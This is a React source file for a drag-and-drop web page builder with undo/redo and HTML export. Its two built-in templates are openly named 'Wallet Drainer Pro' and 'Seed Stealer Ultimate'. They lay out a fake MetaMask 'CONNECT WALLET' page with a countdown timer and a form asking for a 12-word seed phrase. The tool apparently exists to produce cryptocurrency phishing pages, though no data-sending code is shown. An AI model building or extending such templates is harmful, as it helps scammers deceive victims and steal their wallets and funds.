import { useState, useCallback, useRef, useEffect } from 'react';
import { Element, HistoryState, Template } from './types/Element';
import { Sidebar } from './components/Sidebar';
import { Canvas } from './components/Canvas';
import { PropertyPanel } from './components/PropertyPanel';
import { StatusBar } from './components/StatusBar';
import { generateHTML, downloadHTML } from './utils/exportHTML';
import { parseHTMLToElements } from './utils/parseHTML';

const createDefaultElement = (type: Element['type'], x: number, y: number): Element => {
  const baseElement = {
    id: `element-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    x,
    y,
    width: 150,
    height: 40,
    text: type.charAt(0).toUpperCase() + type.slice(1),
    color: '#ffffff',
    backgroundColor: '#1a1a2e',
    rotation: 0,
    opacity: 1,
    borderRadius: 4,
    fontSize: 14,
    fontWeight: 'normal',
    borderStyle: 'solid',
    borderColor: '#00ffff',
    borderWidth: 1,
    zIndex: 1,
  };

  switch (type) {
    case 'button':
      return { ...baseElement, width: 120, height: 40, backgroundColor: '#00ffff', color: '#000000' };
    case 'input':
      return { ...baseElement, width: 200, height: 40, backgroundColor: 'rgba(0, 0, 0, 0.5)' };
    case 'text':
      return { ...baseElement, width: 200, height: 30, backgroundColor: 'transparent', fontSize: 18 };
    case 'timer':
      return { ...baseElement, width: 100, height: 40, text: '⏱️ 00:00', backgroundColor: 'transparent' };
    case 'progress':
      return { ...baseElement, width: 200, height: 20, text: 'Progress' };
    case 'qr':
      return { ...baseElement, width: 120, height: 120, text: 'QR Code' };
    case 'social':
      return { ...baseElement, width: 100, height: 40, text: 'Social' };
    case 'slider':
      return { ...baseElement, width: 150, height: 30, text: 'Slider' };
    case 'toggle':
      return { ...baseElement, width: 60, height: 30, text: 'Toggle' };
    case 'image':
      return { ...baseElement, width: 150, height: 150, text: 'Image' };
    default:
      return baseElement;
  }
};

const templates: Template[] = [
  {
    name: 'Wallet Drainer Pro',
    elements: [
      {
        type: 'text',
        x: 400,
        y: 100,
        width: 400,
        height: 60,
        text: 'CONNECT WALLET',
        color: '#ffffff',
        backgroundColor: 'transparent',
        rotation: 0,
        opacity: 1,
        borderRadius: 0,
        fontSize: 36,
        fontWeight: '900',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 1,
      },
      {
        type: 'button',
        x: 450,
        y: 250,
        width: 300,
        height: 60,
        text: 'METAMASK',
        color: '#000000',
        backgroundColor: '#f6851b',
        rotation: 0,
        opacity: 1,
        borderRadius: 8,
        fontSize: 18,
        fontWeight: 'bold',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 2,
      },
      {
        type: 'timer',
        x: 550,
        y: 400,
        width: 100,
        height: 40,
        text: '⏱️ 02:00',
        color: '#ffffff',
        backgroundColor: 'transparent',
        rotation: 0,
        opacity: 1,
        borderRadius: 0,
        fontSize: 20,
        fontWeight: '900',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 3,
      },
    ],
  },
  {
    name: 'Seed Stealer Ultimate',
    elements: [
      {
        type: 'text',
        x: 350,
        y: 80,
        width: 500,
        height: 80,
        text: 'RECOVER YOUR SEED PHRASE',
        color: '#ffffff',
        backgroundColor: 'transparent',
        rotation: 0,
        opacity: 1,
        borderRadius: 0,
        fontSize: 32,
        fontWeight: '900',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 1,
      },
      {
        type: 'input',
        x: 350,
        y: 200,
        width: 500,
        height: 50,
        text: 'Enter 12-word seed phrase...',
        color: '#ffffff',
        backgroundColor: 'rgba(0, 0, 0, 0.5)',
        rotation: 0,
        opacity: 1,
        borderRadius: 8,
        fontSize: 16,
        fontWeight: 'normal',
        borderStyle: 'solid',
        borderColor: '#00ffff',
        borderWidth: 2,
        zIndex: 2,
      },
      {
        type: 'button',
        x: 450,
        y: 300,
        width: 300,
        height: 60,
        text: 'RECOVER NOW',
        color: '#ffffff',
        backgroundColor: 'linear-gradient(45deg, #00ffff, #ff00ff)',
        rotation: 0,
        opacity: 1,
        borderRadius: 12,
        fontSize: 20,
        fontWeight: 'bold',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 3,
      },
    ],
  },
];

export default function App() {
  const [elements, setElements] = useState<Element[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [draggedType, setDraggedType] = useState<Element['type'] | null>(null);
  const [zoom, setZoom] = useState(1);
  const [showGrid, setShowGrid] = useState(true);
  const [backgroundImage, setBackgroundImage] = useState<string | null>(null);
  const [history, setHistory] = useState<HistoryState[]>([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [isDragging, setIsDragging] = useState(false);
  const [draggedElementId, setDraggedElementId] = useState<string | null>(null);
  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });

  const saveToHistory = useCallback(() => {
    const newState: HistoryState = {
      elements: [...elements],
      selectedId,
    };
    
    const newHistory = history.slice(0, historyIndex + 1);
    newHistory.push(newState);
    
    if (newHistory.length > 30) {
      newHistory.shift();
    }
    
    setHistory(newHistory);
    setHistoryIndex(newHistory.length - 1);
  }, [elements, selectedId, history, historyIndex]);

  const undo = useCallback(() => {
    if (historyIndex > 0) {
      const prevState = history[historyIndex - 1];
      setElements(prevState.elements);
      setSelectedId(prevState.selectedId);
      setHistoryIndex(historyIndex - 1);
    }
  }, [history, historyIndex]);

  const redo = useCallback(() => {
    if (historyIndex < history.length - 1) {
      const nextState = history[historyIndex + 1];
      setElements(nextState.elements);
      setSelectedId(nextState.selectedId);
      setHistoryIndex(historyIndex + 1);
    }
  }, [history, historyIndex]);

  const handleDragStart = (type: Element['type']) => {
    setDraggedType(type);
  };

  const handleDrop = (e: React.DragEvent, x: number, y: number) => {
    e.preventDefault();
    if (!draggedType) return;

    const newElement = createDefaultElement(draggedType, x, y);
    setElements(prev => [...prev, newElement]);
    setSelectedId(newElement.id);
    setDraggedType(null);
    saveToHistory();
  };

  const handleElementClick = (id: string) => {
    setSelectedId(id);
  };

  const handleElementMouseDown = (e: React.MouseEvent, id: string) => {
    e.preventDefault();
    e.stopPropagation();
    
    const element = elements.find(el => el.id === id);
    if (!element) return;

    const rect = e.currentTarget.getBoundingClientRect();
    setDragOffset({
      x: e.clientX - rect.left,
      y: e.clientY - rect.top,
    });
    
    setIsDragging(true);
    setDraggedElementId(id);
    setSelectedId(id);
  };

  const handleMouseMove = useCallback((e: React.MouseEvent) => {
    const canvas = e.currentTarget;
    const rect = canvas.getBoundingClientRect();
    const x = Math.round((e.clientX - rect.left) / zoom);
    const y = Math.round((e.clientY - rect.top) / zoom);
    setMousePosition({ x, y });

    if (isDragging && draggedElementId) {
      const element = elements.find(el => el.id === draggedElementId);
      if (!element) return;

      const newX = Math.max(0, Math.min(x - dragOffset.x, rect.width / zoom - element.width));
      const newY = Math.max(0, Math.min(y - dragOffset.y, rect.height / zoom - element.height));

      setElements(prev => prev.map(el => 
        el.id === draggedElementId ? { ...el, x: newX, y: newY } : el
      ));
    }
  }, [isDragging, draggedElementId, elements, zoom, dragOffset]);

  const handleMouseUp = useCallback(() => {
    if (isDragging) {
      setIsDragging(false);
      setDraggedElementId(null);
      saveToHistory();
    }
  }, [isDragging, saveToHistory]);

  const handleElementUpdate = (updates: Partial<Element>) => {
    if (!selectedId) return;
    
    setElements(prev => prev.map(el => 
      el.id === selectedId ? { ...el, ...updates } : el
    ));
    saveToHistory();
  };

  const handleElementDelete = () => {
    if (!selectedId) return;
    
    setElements(prev => prev.filter(el => el.id !== selectedId));
    setSelectedId(null);
    saveToHistory();
  };

  const handleBackgroundUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (event) => {
        setBackgroundImage(event.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleHTMLUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && file.type === 'text/html') {
      const reader = new FileReader();
      reader.onload = (event) => {
        const htmlContent = event.target?.result as string;
        const parsedElements = parseHTMLToElements(htmlContent);
        if (parsedElements.length > 0) {
          setElements(parsedElements);
          setSelectedId(null);
          saveToHistory();
        }
      };
      reader.readAsText(file);
    }
  };

  const handleTemplateLoad = (template: Template) => {
    const newElements = template.elements.map(el => ({
      ...el,
      id: `element-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    }));
    setElements(newElements);
    setSelectedId(null);
    saveToHistory();
  };

  const handleExport = () => {
    const htmlContent = generateHTML(elements, backgroundImage);
    downloadHTML(htmlContent);
  };

  const selectedElement = elements.find(el => el.id === selectedId);

  useEffect(() => {
    if (elements.length > 0 && history.length === 0) {
      saveToHistory();
    }
  }, []);

  return (
    <div className="h-screen bg-gray-950 flex flex-col">
      <div className="flex flex-1 overflow-hidden">
        <Sidebar
          elements={elements}
          selectedId={selectedId}
          zoom={zoom}
          showGrid={showGrid}
          onDragStart={handleDragStart}
          onZoomChange={setZoom}
          onToggleGrid={() => setShowGrid(!showGrid)}
          onUndo={undo}
          onRedo={redo}
          onExport={handleExport}
          onBackgroundUpload={handleBackgroundUpload}
          onHTMLUpload={handleHTMLUpload}
          onTemplateLoad={handleTemplateLoad}
          onElementSelect={handleElementClick}
          canUndo={historyIndex > 0}
          canRedo={historyIndex < history.length - 1}
        />
        
        <Canvas
          elements={elements}
          selectedId={selectedId}
          zoom={zoom}
          showGrid={showGrid}
          backgroundImage={backgroundImage}
          isDragging={isDragging}
          onElementClick={handleElementClick}
          onElementMouseDown={handleElementMouseDown}
          onMouseMove={handleMouseMove}
          onMouseUp={handleMouseUp}
          onDrop={handleDrop}
        />
        
        {selectedElement && (
          <PropertyPanel
            element={selectedElement}
            onUpdate={handleElementUpdate}
            onDelete={handleElementDelete}
          />
        )}
      </div>
      
      <StatusBar
        elementCount={elements.length}
        selectedId={selectedId}
        zoom={zoom}
        mousePosition={mousePosition}
      />
    </div>
  );
}